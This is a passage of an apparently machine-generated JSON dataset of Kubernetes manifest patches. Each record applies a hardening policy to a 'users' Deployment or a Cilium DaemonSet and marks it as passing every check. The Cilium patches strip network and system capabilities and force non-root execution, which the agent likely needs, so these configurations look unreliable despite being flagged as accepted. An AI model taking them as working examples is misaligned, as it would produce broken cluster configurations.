readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00936",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api:stable\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: database-password-secret\n              key: database_password\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00937",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api:stable\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: database-password-secret\n              key: database_password\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "00938",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api:stable\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: database-password-secret\n              key: database_password\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00939",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: users\n  template:\n    metadata:\n      labels:\n        component: users\n    spec:\n      containers:\n      - name: users\n        image: sbalasubramanian14/users-api:stable\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DATABASE_HOST\n          value: mysql-cluster-ip-service\n        - name: DATABASE_NAME\n          value: mydatabase\n        - name: DATABASE_USERNAME\n          value: root\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: database-password-secret\n              key: database_password\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "00940",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00941",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00942",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00943",
    "policy_id": "drop_capabilities",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - image: docker.io/cilium/cilium:stable\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add: []\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "errors": []
  },
  {
    "id": "00944",
    "policy_id": "drop_capabilities",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
